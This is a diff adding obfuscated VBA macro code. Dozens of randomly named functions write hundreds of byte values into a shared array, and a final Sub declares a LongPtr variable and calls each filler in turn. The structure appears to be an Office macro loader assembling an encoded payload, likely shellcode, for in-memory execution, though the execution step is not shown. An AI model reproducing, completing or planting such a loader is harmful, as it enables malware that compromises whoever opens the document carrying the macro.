+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 43) = 167
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 44) = 82
+n6Kb1WOJ7qurrG(1620) = 8
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 46) = 99
+n6Kb1WOJ7qurrG(1622) = 247
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 48) = 34
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 49) = 44
+n6Kb1WOJ7qurrG(1625) = 99
+n6Kb1WOJ7qurrG(1626) = 85
+n6Kb1WOJ7qurrG(1627) = 143
+n6Kb1WOJ7qurrG(1628) = 28
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 54) = 184
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 55) = 147
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 56) = 61
+n6Kb1WOJ7qurrG(1632) = 155
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 58) = 233
+n6Kb1WOJ7qurrG(1634) = 134
+n6Kb1WOJ7qurrG(1635) = 85
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 61) = 167
+n6Kb1WOJ7qurrG(1637) = 200
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 63) = 167
+n6Kb1WOJ7qurrG(1639) = 22
+n6Kb1WOJ7qurrG(1640) = 211
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 66) = 216
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 67) = 167
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 68) = 114
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 69) = 50
+n6Kb1WOJ7qurrG(1645) = 158
+n6Kb1WOJ7qurrG(1646) = 220
+n6Kb1WOJ7qurrG(1647) = 96
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 73) = 211
+n6Kb1WOJ7qurrG(1649) = 148
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 75) = 128
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 76) = 193
+n6Kb1WOJ7qurrG(1652) = 62
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 78) = 25
+n6Kb1WOJ7qurrG(1654) = 74
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 80) = 115
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 81) = 174
+n6Kb1WOJ7qurrG(1657) = 23
+n6Kb1WOJ7qurrG(1658) = 75
+n6Kb1WOJ7qurrG(1659) = 96
+n6Kb1WOJ7qurrG(1660) = 211
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 86) = 140
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 87) = 128
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 88) = 193
+n6Kb1WOJ7qurrG(1664) = 62
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 90) = 25
+n6Kb1WOJ7qurrG(1666) = 81
+
+End Function
+Private Function MkX(ByVal nyMpdGOp As Currency, ByRef pJ20jV As Variant, ByRef xkoZHsANHYe As Object, ByVal IjnESLhgy As Long, ByVal S7l60dNs0 As Long) As Object
+pJ20jV(S7l60dNs0 + 0) = 115
+pJ20jV(1668) = 174
+pJ20jV(S7l60dNs0 + 2) = 21
+pJ20jV(S7l60dNs0 + 3) = 7
+pJ20jV(1671) = 34
+pJ20jV(S7l60dNs0 + 5) = 216
+pJ20jV(1673) = 156
+pJ20jV(S7l60dNs0 + 7) = 131
+pJ20jV(S7l60dNs0 + 8) = 6
+pJ20jV(1676) = 62
+pJ20jV(1677) = 23
+pJ20jV(1678) = 147
+pJ20jV(1679) = 5
+pJ20jV(S7l60dNs0 + 13) = 159
+pJ20jV(S7l60dNs0 + 14) = 250
+pJ20jV(S7l60dNs0 + 15) = 6
+pJ20jV(1683) = 212
+pJ20jV(S7l60dNs0 + 17) = 45
+pJ20jV(1685) = 106
+pJ20jV(1686) = 10
+pJ20jV(S7l60dNs0 + 20) = 130
+pJ20jV(1688) = 124
+pJ20jV(S7l60dNs0 + 22) = 24
+pJ20jV(1690) = 131
+pJ20jV(1691) = 6
+pJ20jV(S7l60dNs0 + 25) = 88
+pJ20jV(S7l60dNs0 + 26) = 17
+pJ20jV(S7l60dNs0 + 27) = 55
+pJ20jV(S7l60dNs0 + 28) = 34
+pJ20jV(1696) = 200
+pJ20jV(1697) = 156
+pJ20jV(1698) = 131
+pJ20jV(S7l60dNs0 + 32) = 6
+pJ20jV(1700) = 48
+pJ20jV(S7l60dNs0 + 34) = 152
+pJ20jV(S7l60dNs0 + 35) = 130
+pJ20jV(1703) = 6
+pJ20jV(S7l60dNs0 + 37) = 88
+pJ20jV(1705) = 23
+pJ20jV(S7l60dNs0 + 39) = 69
+pJ20jV(S7l60dNs0 + 40) = 86
+pJ20jV(1708) = 9
+pJ20jV(1709) = 99
+pJ20jV(1710) = 215
+pJ20jV(1711) = 34
+pJ20jV(S7l60dNs0 + 45) = 68
+pJ20jV(S7l60dNs0 + 46) = 25
+pJ20jV(S7l60dNs0 + 47) = 67
+pJ20jV(1715) = 115
+pJ20jV(S7l60dNs0 + 49) = 93
+pJ20jV(1717) = 207
+pJ20jV(1718) = 124
+pJ20jV(S7l60dNs0 + 52) = 82
+pJ20jV(1720) = 124
+pJ20jV(S7l60dNs0 + 54) = 140
+pJ20jV(1722) = 128
+pJ20jV(1723) = 241
+pJ20jV(S7l60dNs0 + 57) = 62
+pJ20jV(S7l60dNs0 + 58) = 165
+pJ20jV(S7l60dNs0 + 59) = 157
+pJ20jV(S7l60dNs0 + 60) = 115
+pJ20jV(1728) = 161
+pJ20jV(1729) = 246
+pJ20jV(1730) = 223
+pJ20jV(S7l60dNs0 + 64) = 94
+pJ20jV(1732) = 62
+pJ20jV(S7l60dNs0 + 66) = 21
+pJ20jV(S7l60dNs0 + 67) = 133
+pJ20jV(1735) = 5
+pJ20jV(S7l60dNs0 + 69) = 175
+pJ20jV(1737) = 23
+pJ20jV(S7l60dNs0 + 71) = 7
+pJ20jV(S7l60dNs0 + 72) = 34
+pJ20jV(1740) = 216
+pJ20jV(1741) = 156
+pJ20jV(1742) = 131
+pJ20jV(1743) = 6
+pJ20jV(S7l60dNs0 + 77) = 87
+pJ20jV(S7l60dNs0 + 78) = 43
+pJ20jV(S7l60dNs0 + 79) = 131
+pJ20jV(1747) = 7
+pJ20jV(S7l60dNs0 + 81) = 228
+pJ20jV(1749) = 184
+pJ20jV(1750) = 3
+pJ20jV(S7l60dNs0 + 84) = 6
+pJ20jV(1752) = 88
+pJ20jV(S7l60dNs0 + 86) = 156
+pJ20jV(1754) = 229
+pJ20jV(1755) = 143
+pJ20jV(S7l60dNs0 + 89) = 94
+pJ20jV(S7l60dNs0 + 90) = 159
+pJ20jV(S7l60dNs0 + 91) = 116
+
+End Function
+Function wH1sop(ByVal FsYj As Long, ByRef RD8kJ As Variant, ByVal lR8k As Long, ByRef o3rc8rZI47Nq8jD As Long) As Byte
+RD8kJ(FsYj + 0) = 96
+RD8kJ(FsYj + 1) = 99
+RD8kJ(FsYj + 2) = 95
+RD8kJ(1762) = 246
+RD8kJ(1763) = 227
+RD8kJ(1764) = 50
+RD8kJ(FsYj + 6) = 178
+RD8kJ(1766) = 168
+RD8kJ(FsYj + 8) = 241
+RD8kJ(FsYj + 9) = 0
+RD8kJ(1769) = 250
+RD8kJ(FsYj + 11) = 10
+RD8kJ(1771) = 0
+RD8kJ(FsYj + 13) = 211
+RD8kJ(FsYj + 14) = 24
+RD8kJ(1774) = 167
+RD8kJ(1775) = 130
+RD8kJ(1776) = 88
+RD8kJ(1777) = 156
+RD8kJ(FsYj + 19) = 131
+RD8kJ(FsYj + 20) = 9
+RD8kJ(FsYj + 21) = 239
+RD8kJ(1781) = 156
+RD8kJ(FsYj + 23) = 130
+RD8kJ(1783) = 186
+RD8kJ(1784) = 124
+RD8kJ(FsYj + 26) = 24
+RD8kJ(1786) = 131
+RD8kJ(FsYj + 28) = 6
+RD8kJ(1788) = 88
+RD8kJ(1789) = 159
+RD8kJ(FsYj + 31) = 116
+RD8kJ(FsYj + 32) = 96
+RD8kJ(FsYj + 33) = 209
+RD8kJ(FsYj + 34) = 154
+RD8kJ(1794) = 229
+RD8kJ(1795) = 61
+RD8kJ(1796) = 155
+RD8kJ(FsYj + 38) = 233
+RD8kJ(1798) = 102
+RD8kJ(FsYj + 40) = 85
+RD8kJ(FsYj + 41) = 11
+RD8kJ(1801) = 17
+RD8kJ(FsYj + 43) = 7
+RD8kJ(1803) = 34
+RD8kJ(FsYj + 45) = 192
+RD8kJ(FsYj + 46) = 156
+RD8kJ(1806) = 131
+RD8kJ(1807) = 6
+RD8kJ(1808) = 8
+RD8kJ(1809) = 99
+RD8kJ(FsYj + 51) = 55
+RD8kJ(FsYj + 52) = 34
+RD8kJ(FsYj + 53) = 216
+RD8kJ(1813) = 156
+RD8kJ(FsYj + 55) = 131
+RD8kJ(1815) = 6
+RD8kJ(1816) = 11
+RD8kJ(FsYj + 58) = 99
+RD8kJ(1818) = 23
+RD8kJ(FsYj + 60) = 34
+RD8kJ(1820) = 248
+RD8kJ(1821) = 156
+RD8kJ(FsYj + 63) = 131
+RD8kJ(FsYj + 64) = 6
+RD8kJ(FsYj + 65) = 221
+RD8kJ(FsYj + 66) = 92
+RD8kJ(1826) = 250
+RD8kJ(1827) = 3
+RD8kJ(1828) = 11
+RD8kJ(FsYj + 70) = 99
+RD8kJ(1830) = 215
+RD8kJ(FsYj + 72) = 34
+RD8kJ(FsYj + 73) = 72
+RD8kJ(1833) = 246
+RD8kJ(FsYj + 75) = 130
+RD8kJ(1835) = 85
+RD8kJ(FsYj + 77) = 11
+RD8kJ(FsYj + 78) = 17
+RD8kJ(1838) = 7
+RD8kJ(1839) = 34
+RD8kJ(1840) = 196
+RD8kJ(1841) = 156
+RD8kJ(FsYj + 83) = 131
+RD8kJ(FsYj + 84) = 6
+RD8kJ(FsYj + 85) = 8
+RD8kJ(1845) = 207
+RD8kJ(FsYj + 87) = 208
+
+End Function
+Function zAqd5wc(ByRef ZXM As Variant, ByVal QirDiAxjQ As Long, ByVal ysbJGWtb2a5P As Long, ByVal BW2 As Integer) As Variant
+ZXM(1847) = 249
+ZXM(QirDiAxjQ + 1) = 204
+ZXM(1849) = 184
+ZXM(1850) = 19
+ZXM(QirDiAxjQ + 4) = 6
+ZXM(1852) = 88
+ZXM(QirDiAxjQ + 6) = 156
+ZXM(1854) = 6
+ZXM(1855) = 198
+ZXM(QirDiAxjQ + 9) = 45
+ZXM(QirDiAxjQ + 10) = 153
+ZXM(QirDiAxjQ + 11) = 208
+ZXM(QirDiAxjQ + 12) = 249
+ZXM(1860) = 12
+ZXM(1861) = 184
+ZXM(1862) = 147
+ZXM(QirDiAxjQ + 16) = 85
+ZXM(1864) = 167
+ZXM(QirDiAxjQ + 18) = 200
+ZXM(QirDiAxjQ + 19) = 167
+ZXM(1867) = 22
+ZXM(QirDiAxjQ + 21) = 7
+ZXM(1869) = 194
+ZXM(QirDiAxjQ + 23) = 216
+ZXM(QirDiAxjQ + 24) = 141
+ZXM(1872) = 189
+ZXM(1873) = 193
+ZXM(1874) = 64
+ZXM(1875) = 141
+ZXM(QirDiAxjQ + 29) = 38
+ZXM(QirDiAxjQ + 30) = 132
+ZXM(QirDiAxjQ + 31) = 10
+ZXM(1879) = 122
+ZXM(QirDiAxjQ + 33) = 124
+ZXM(1881) = 236
+ZXM(1882) = 106
+ZXM(QirDiAxjQ + 36) = 76
+ZXM(1884) = 166
+ZXM(QirDiAxjQ + 38) = 99
+ZXM(1886) = 124
+ZXM(1887) = 85
+ZXM(QirDiAxjQ + 41) = 13
+ZXM(QirDiAxjQ + 42) = 202
+ZXM(QirDiAxjQ + 43) = 212
+ZXM(QirDiAxjQ + 44) = 53
+ZXM(1892) = 167
+ZXM(1893) = 23
+ZXM(1894) = 115
+ZXM(QirDiAxjQ + 48) = 53
+ZXM(1896) = 138
+ZXM(QirDiAxjQ + 50) = 119
+ZXM(QirDiAxjQ + 51) = 183
+ZXM(1899) = 9
+ZXM(QirDiAxjQ + 53) = 239
+ZXM(1901) = 68
+ZXM(QirDiAxjQ + 55) = 14
+ZXM(QirDiAxjQ + 56) = 69
+ZXM(1904) = 231
+ZXM(1905) = 31
+ZXM(1906) = 69
+ZXM(1907) = 4
+ZXM(QirDiAxjQ + 61) = 62
+ZXM(QirDiAxjQ + 62) = 31
+ZXM(QirDiAxjQ + 63) = 123
+ZXM(1911) = 31
+ZXM(QirDiAxjQ + 65) = 47
+ZXM(1913) = 159
+ZXM(1914) = 0
+ZXM(QirDiAxjQ + 68) = 205
+ZXM(1916) = 120
+ZXM(QirDiAxjQ + 70) = 246
+ZXM(1918) = 131
+ZXM(1919) = 110
+ZXM(QirDiAxjQ + 73) = 159
+ZXM(QirDiAxjQ + 74) = 156
+ZXM(QirDiAxjQ + 75) = 131
+ZXM(QirDiAxjQ + 76) = 6
+ZXM(1924) = 10
+ZXM(1925) = 203
+ZXM(1926) = 107
+ZXM(QirDiAxjQ + 80) = 254
+ZXM(1928) = 88
+ZXM(QirDiAxjQ + 82) = 156
+
+End Function
+Function kYxT8CJ(ByVal R66TnIoJxS8PX2 As Long, ByVal GmXHI8fjwE3 As Long, ByRef FPms9bCw9 As Variant, ByVal X5k As Boolean, ByRef SO3D As Boolean, ByVal pCQTZa As Date) As String
+FPms9bCw9(R66TnIoJxS8PX2 + 0) = 131
+FPms9bCw9(R66TnIoJxS8PX2 + 1) = 141
+FPms9bCw9(1932) = 144
+FPms9bCw9(1933) = 147
+FPms9bCw9(1934) = 52
+FPms9bCw9(R66TnIoJxS8PX2 + 5) = 197
+FPms9bCw9(1936) = 211
+FPms9bCw9(R66TnIoJxS8PX2 + 7) = 118
+FPms9bCw9(R66TnIoJxS8PX2 + 8) = 26
+FPms9bCw9(1939) = 5
+FPms9bCw9(R66TnIoJxS8PX2 + 10) = 144
+FPms9bCw9(1941) = 143
+FPms9bCw9(R66TnIoJxS8PX2 + 12) = 86
+FPms9bCw9(R66TnIoJxS8PX2 + 13) = 53
+FPms9bCw9(1944) = 152
+FPms9bCw9(1945) = 175
+FPms9bCw9(1946) = 75
+FPms9bCw9(1947) = 53
+FPms9bCw9(R66TnIoJxS8PX2 + 18) = 143
+FPms9bCw9(R66TnIoJxS8PX2 + 19) = 23
+FPms9bCw9(R66TnIoJxS8PX2 + 20) = 122
+FPms9bCw9(1951) = 9
+FPms9bCw9(R66TnIoJxS8PX2 + 22) = 239
+FPms9bCw9(1953) = 154
+FPms9bCw9(1954) = 229
+FPms9bCw9(R66TnIoJxS8PX2 + 25) = 131
+FPms9bCw9(1956) = 152
+FPms9bCw9(R66TnIoJxS8PX2 + 27) = 233
+FPms9bCw9(1958) = 71
+FPms9bCw9(1959) = 141
+FPms9bCw9(R66TnIoJxS8PX2 + 30) = 159
+FPms9bCw9(R66TnIoJxS8PX2 + 31) = 195
+FPms9bCw9(R66TnIoJxS8PX2 + 32) = 221
+FPms9bCw9(R66TnIoJxS8PX2 + 33) = 91
+FPms9bCw9(1964) = 3
+FPms9bCw9(1965) = 95
+FPms9bCw9(1966) = 208
+FPms9bCw9(R66TnIoJxS8PX2 + 37) = 83
+FPms9bCw9(1968) = 14
+FPms9bCw9(R66TnIoJxS8PX2 + 39) = 203
+FPms9bCw9(R66TnIoJxS8PX2 + 40) = 176
+FPms9bCw9(1971) = 249
+FPms9bCw9(R66TnIoJxS8PX2 + 42) = 211
+FPms9bCw9(1973) = 108
+FPms9bCw9(R66TnIoJxS8PX2 + 44) = 176
+FPms9bCw9(R66TnIoJxS8PX2 + 45) = 212
+FPms9bCw9(1976) = 179
+FPms9bCw9(1977) = 179
+FPms9bCw9(1978) = 9
+FPms9bCw9(1979) = 222
+FPms9bCw9(R66TnIoJxS8PX2 + 50) = 30
+FPms9bCw9(R66TnIoJxS8PX2 + 51) = 17
+FPms9bCw9(R66TnIoJxS8PX2 + 52) = 192
+FPms9bCw9(1983) = 185
+FPms9bCw9(R66TnIoJxS8PX2 + 54) = 100
+FPms9bCw9(1985) = 133
+FPms9bCw9(1986) = 244
+FPms9bCw9(R66TnIoJxS8PX2 + 57) = 5
+FPms9bCw9(1988) = 216
+FPms9bCw9(R66TnIoJxS8PX2 + 59) = 87
+FPms9bCw9(1990) = 163
+FPms9bCw9(1991) = 108
+FPms9bCw9(R66TnIoJxS8PX2 + 62) = 88
+FPms9bCw9(R66TnIoJxS8PX2 + 63) = 244
+FPms9bCw9(R66TnIoJxS8PX2 + 64) = 68
+FPms9bCw9(R66TnIoJxS8PX2 + 65) = 6
+FPms9bCw9(1996) = 88
+FPms9bCw9(1997) = 156
+FPms9bCw9(1998) = 209
+FPms9bCw9(R66TnIoJxS8PX2 + 69) = 81
+FPms9bCw9(2000) = 176
+FPms9bCw9(R66TnIoJxS8PX2 + 71) = 50
+FPms9bCw9(R66TnIoJxS8PX2 + 72) = 131
+FPms9bCw9(2003) = 6
+FPms9bCw9(R66TnIoJxS8PX2 + 74) = 88
+FPms9bCw9(2005) = 23
+FPms9bCw9(R66TnIoJxS8PX2 + 76) = 75
+FPms9bCw9(R66TnIoJxS8PX2 + 77) = 9
+FPms9bCw9(2008) = 230
+FPms9bCw9(2009) = 95
+FPms9bCw9(2010) = 8
+FPms9bCw9(2011) = 236
+FPms9bCw9(R66TnIoJxS8PX2 + 82) = 193
+FPms9bCw9(R66TnIoJxS8PX2 + 83) = 159
+FPms9bCw9(R66TnIoJxS8PX2 + 84) = 75
+FPms9bCw9(2015) = 21
+FPms9bCw9(R66TnIoJxS8PX2 + 86) = 141
+FPms9bCw9(2017) = 175
+FPms9bCw9(2018) = 67
+FPms9bCw9(R66TnIoJxS8PX2 + 89) = 53
+FPms9bCw9(2020) = 144
+FPms9bCw9(R66TnIoJxS8PX2 + 91) = 175
+FPms9bCw9(2022) = 84
+FPms9bCw9(2023) = 141
+FPms9bCw9(R66TnIoJxS8PX2 + 94) = 161
+FPms9bCw9(R66TnIoJxS8PX2 + 95) = 22
+FPms9bCw9(R66TnIoJxS8PX2 + 96) = 133
+FPms9bCw9(R66TnIoJxS8PX2 + 97) = 130
+FPms9bCw9(2028) = 152
+FPms9bCw9(2029) = 233
+FPms9bCw9(2030) = 72
+FPms9bCw9(R66TnIoJxS8PX2 + 101) = 141
+FPms9bCw9(2032) = 159
+FPms9bCw9(R66TnIoJxS8PX2 + 103) = 195
+
+End Function
+Private Function QETj2GrBec(ByRef HjyYLp8wbLO As Double, ByRef aWPLyU As Currency, ByVal yprGoPh8OjBK As Long, ByVal KsNFy As Variant, ByVal mKVRuS As Long, ByRef K7bsKFJ As Long, ByRef vIwlJu2xBU As Variant) As Byte
+vIwlJu2xBU(2034) = 221
+vIwlJu2xBU(2035) = 91
+vIwlJu2xBU(mKVRuS + 2) = 3
+vIwlJu2xBU(mKVRuS + 3) = 95
+vIwlJu2xBU(mKVRuS + 4) = 214
+vIwlJu2xBU(2039) = 141
+vIwlJu2xBU(mKVRuS + 6) = 180
+vIwlJu2xBU(2041) = 205
+vIwlJu2xBU(2042) = 210
+vIwlJu2xBU(mKVRuS + 9) = 141
+vIwlJu2xBU(2044) = 21
+vIwlJu2xBU(mKVRuS + 11) = 148
+vIwlJu2xBU(2046) = 8
+vIwlJu2xBU(2047) = 87
+vIwlJu2xBU(mKVRuS + 14) = 100
+vIwlJu2xBU(mKVRuS + 15) = 23
+vIwlJu2xBU(mKVRuS + 16) = 199
+vIwlJu2xBU(mKVRuS + 17) = 12
+vIwlJu2xBU(2052) = 32
+vIwlJu2xBU(2053) = 207
+vIwlJu2xBU(2054) = 213
+vIwlJu2xBU(mKVRuS + 21) = 81
+vIwlJu2xBU(2056) = 221
+vIwlJu2xBU(mKVRuS + 23) = 92
+vIwlJu2xBU(mKVRuS + 24) = 246
+vIwlJu2xBU(2059) = 12
+vIwlJu2xBU(mKVRuS + 26) = 97
+vIwlJu2xBU(2061) = 216
+vIwlJu2xBU(mKVRuS + 28) = 137
+vIwlJu2xBU(mKVRuS + 29) = 122
+vIwlJu2xBU(2064) = 45
+vIwlJu2xBU(2065) = 152
+vIwlJu2xBU(2066) = 176
+vIwlJu2xBU(2067) = 198
+vIwlJu2xBU(mKVRuS + 34) = 179
+vIwlJu2xBU(mKVRuS + 35) = 199
+vIwlJu2xBU(mKVRuS + 36) = 0
+vIwlJu2xBU(2071) = 99
+vIwlJu2xBU(mKVRuS + 38) = 164
+vIwlJu2xBU(2073) = 156
+
+End Function
+Private Function AK3B28PT2i9(ByVal HMEjpa As Long, ByVal Ian9ekx As Integer, ByRef NbYCX1YovhOQ5RS As Object, ByRef SGrhqIVlg6xp6a As String, ByVal GTVOCJ5 As Long, ByRef vS8p1Ic9ZgO As Byte, ByRef mvfkIdts4f7My5 As Variant) As Object
+mvfkIdts4f7My5(HMEjpa + 0) = 128
+mvfkIdts4f7My5(HMEjpa + 1) = 199
+mvfkIdts4f7My5(HMEjpa + 2) = 211
+mvfkIdts4f7My5(2077) = 228
+mvfkIdts4f7My5(HMEjpa + 4) = 159
+mvfkIdts4f7My5(2079) = 141
+mvfkIdts4f7My5(2080) = 40
+mvfkIdts4f7My5(HMEjpa + 7) = 188
+mvfkIdts4f7My5(2082) = 8
+mvfkIdts4f7My5(HMEjpa + 9) = 94
+mvfkIdts4f7My5(2084) = 124
+mvfkIdts4f7My5(2085) = 23
+mvfkIdts4f7My5(HMEjpa + 12) = 195
+mvfkIdts4f7My5(HMEjpa + 13) = 30
+mvfkIdts4f7My5(HMEjpa + 14) = 91
+mvfkIdts4f7My5(HMEjpa + 15) = 101
+
+End Function
+Static Function pNe(ByRef sjnAWT As Object, ByVal Zv4YTNuMRlKOhPy As Long, ByVal KSzlYURnqo As Long, ByRef YVPA4lNIg3tEE As Variant, ByRef Yl3agFDwMr As Date, ByRef f7yOd As Byte) As Boolean
+YVPA4lNIg3tEE(2090) = 128
+YVPA4lNIg3tEE(2091) = 247
+YVPA4lNIg3tEE(2092) = 91
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 3) = 69
+YVPA4lNIg3tEE(2094) = 10
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 5) = 67
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 6) = 160
+YVPA4lNIg3tEE(2097) = 25
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 8) = 67
+YVPA4lNIg3tEE(2099) = 114
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 10) = 133
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 11) = 119
+YVPA4lNIg3tEE(2102) = 128
+YVPA4lNIg3tEE(2103) = 141
+YVPA4lNIg3tEE(2104) = 21
+YVPA4lNIg3tEE(2105) = 148
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 16) = 8
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 17) = 67
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 18) = 164
+YVPA4lNIg3tEE(2109) = 23
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 20) = 135
+YVPA4lNIg3tEE(2111) = 128
+YVPA4lNIg3tEE(2112) = 91
+YVPA4lNIg3tEE(Zv4YTNuMRlKOhPy + 23) = 93
+YVPA4lNIg3tEE(2114) = 107
+
+End Function
+Function tOe592aLZ4u(ByRef Nrei3 As Variant, ByVal pxaiTPCg As Long, ByVal C1JsIXzGoNJO As Long, ByRef mspni4tf8M5x2 As Single) As Long
+Nrei3(pxaiTPCg + 0) = 97
+Nrei3(2116) = 167
+Nrei3(pxaiTPCg + 2) = 99
+Nrei3(2118) = 124
+Nrei3(pxaiTPCg + 4) = 61
+Nrei3(pxaiTPCg + 5) = 29
+Nrei3(2121) = 144
+Nrei3(2122) = 246
+Nrei3(2123) = 3
+Nrei3(2124) = 99
+Nrei3(pxaiTPCg + 10) = 201
+Nrei3(pxaiTPCg + 11) = 147
+Nrei3(pxaiTPCg + 12) = 114
+Nrei3(2128) = 85
+Nrei3(pxaiTPCg + 14) = 99
+Nrei3(2130) = 198
+Nrei3(2131) = 250
+Nrei3(pxaiTPCg + 17) = 211
+Nrei3(2133) = 217
+Nrei3(pxaiTPCg + 19) = 127
+Nrei3(2135) = 61
+Nrei3(2136) = 29
+Nrei3(pxaiTPCg + 22) = 100
+Nrei3(pxaiTPCg + 23) = 241
+Nrei3(pxaiTPCg + 24) = 221
+Nrei3(pxaiTPCg + 25) = 179
+Nrei3(2141) = 40
+Nrei3(2142) = 8
+Nrei3(2143) = 67
+Nrei3(pxaiTPCg + 29) = 164
+Nrei3(2145) = 147
+Nrei3(pxaiTPCg + 31) = 52
+Nrei3(pxaiTPCg + 32) = 2
+Nrei3(2148) = 27
+Nrei3(pxaiTPCg + 34) = 23
+Nrei3(2150) = 191
+Nrei3(pxaiTPCg + 36) = 129
+Nrei3(pxaiTPCg + 37) = 221
+Nrei3(2153) = 99
+Nrei3(2154) = 247
+Nrei3(2155) = 160
+Nrei3(2156) = 211
+Nrei3(pxaiTPCg + 42) = 217
+Nrei3(pxaiTPCg + 43) = 139
+Nrei3(pxaiTPCg + 44) = 5
+Nrei3(2160) = 159
+Nrei3(pxaiTPCg + 46) = 195
+Nrei3(2162) = 221
+Nrei3(2163) = 93
+Nrei3(pxaiTPCg + 49) = 145
+Nrei3(2165) = 94
+Nrei3(pxaiTPCg + 51) = 143
+Nrei3(2167) = 6
+Nrei3(2168) = 148
+Nrei3(pxaiTPCg + 54) = 80
+Nrei3(pxaiTPCg + 55) = 79
+Nrei3(pxaiTPCg + 56) = 202
+Nrei3(pxaiTPCg + 57) = 148
+Nrei3(2173) = 80
+Nrei3(2174) = 79
+Nrei3(2175) = 202
+Nrei3(pxaiTPCg + 61) = 148
+Nrei3(2177) = 80
+Nrei3(pxaiTPCg + 63) = 79
+Nrei3(pxaiTPCg + 64) = 141
+Nrei3(2180) = 28
+Nrei3(pxaiTPCg + 66) = 184
+Nrei3(2182) = 139
+Nrei3(pxaiTPCg + 68) = 141
+Nrei3(pxaiTPCg + 69) = 20
+Nrei3(2185) = 184
+Nrei3(2186) = 147
+Nrei3(2187) = 13
+Nrei3(2188) = 144
+Nrei3(pxaiTPCg + 74) = 23
+Nrei3(pxaiTPCg + 75) = 207
+Nrei3(pxaiTPCg + 76) = 34
+Nrei3(2192) = 84
+Nrei3(pxaiTPCg + 78) = 233
+Nrei3(2194) = 138
+Nrei3(2195) = 141
+
+End Function
+Private Function E3XeWf9wEF(ByRef v6w51GM As Boolean, ByVal MpPk As Integer, ByVal QGvxASvPGYBjOu As Long, ByRef EpLso3 As Date, ByVal ZtqO9 As Long, ByRef lROSTTySx As Integer, ByRef nDIQ5PYMTBgmj As Variant) As String
+nDIQ5PYMTBgmj(2196) = 28
+nDIQ5PYMTBgmj(2197) = 184
+nDIQ5PYMTBgmj(2198) = 135
+nDIQ5PYMTBgmj(ZtqO9 + 3) = 241
+nDIQ5PYMTBgmj(2200) = 185
+nDIQ5PYMTBgmj(ZtqO9 + 5) = 94
+nDIQ5PYMTBgmj(ZtqO9 + 6) = 147
+nDIQ5PYMTBgmj(2203) = 6
+nDIQ5PYMTBgmj(ZtqO9 + 8) = 11
+nDIQ5PYMTBgmj(2205) = 107
+nDIQ5PYMTBgmj(ZtqO9 + 10) = 98
+nDIQ5PYMTBgmj(ZtqO9 + 11) = 141
+nDIQ5PYMTBgmj(2208) = 128
+nDIQ5PYMTBgmj(2209) = 23
+nDIQ5PYMTBgmj(2210) = 199
+nDIQ5PYMTBgmj(2211) = 34
+nDIQ5PYMTBgmj(ZtqO9 + 16) = 80
+nDIQ5PYMTBgmj(ZtqO9 + 17) = 107
+nDIQ5PYMTBgmj(ZtqO9 + 18) = 231
+nDIQ5PYMTBgmj(2215) = 34
+nDIQ5PYMTBgmj(ZtqO9 + 20) = 76
+nDIQ5PYMTBgmj(2217) = 159
+nDIQ5PYMTBgmj(2218) = 91
+nDIQ5PYMTBgmj(ZtqO9 + 23) = 141
+nDIQ5PYMTBgmj(2220) = 28
+nDIQ5PYMTBgmj(ZtqO9 + 25) = 184
+nDIQ5PYMTBgmj(2222) = 139
+nDIQ5PYMTBgmj(2223) = 241
+nDIQ5PYMTBgmj(ZtqO9 + 28) = 185
+nDIQ5PYMTBgmj(ZtqO9 + 29) = 159
+nDIQ5PYMTBgmj(ZtqO9 + 30) = 80
+nDIQ5PYMTBgmj(ZtqO9 + 31) = 93
+nDIQ5PYMTBgmj(2228) = 154
+nDIQ5PYMTBgmj(2229) = 140
+nDIQ5PYMTBgmj(2230) = 131
+nDIQ5PYMTBgmj(ZtqO9 + 35) = 6
+
+End Function
+
+Sub Yhj8gJzio7RCcB()
+Dim s2XBsWhhW As Long, hZso3b As Long, wEfpk2n As Variant
+#If VBA7 Then
+Dim my5 As LongPtr
+#Else
+Dim my5 As Long
+#End If
+ReDim wEfpk2n(2231)
+jgk False, Now, 170, 124, 0, wEfpk2n, 42
+L4udtKKT1IWn1 42, Now, wEfpk2n, 39, Now
+suD 78, 193, wEfpk2n, True, 36
+unn 176, "JsCvd4evf", wEfpk2n, 150, Nothing
+hyw 96, 252, 0, wEfpk2n
+JUWH Nothing, 273, 6, wEfpk2n
+yEVzMwN wEfpk2n, 314, 115, True
+fzOQvFsOBr wEfpk2n, 352, 27, Nothing, 5, True, Nothing
+ds8vr4OX1qqfnIO 375, 148, wEfpk2n, 46, 245, Nothing
+RyILjIi 142, 448, wEfpk2n, 229
+GZ7Gmhl 174, wEfpk2n, 553
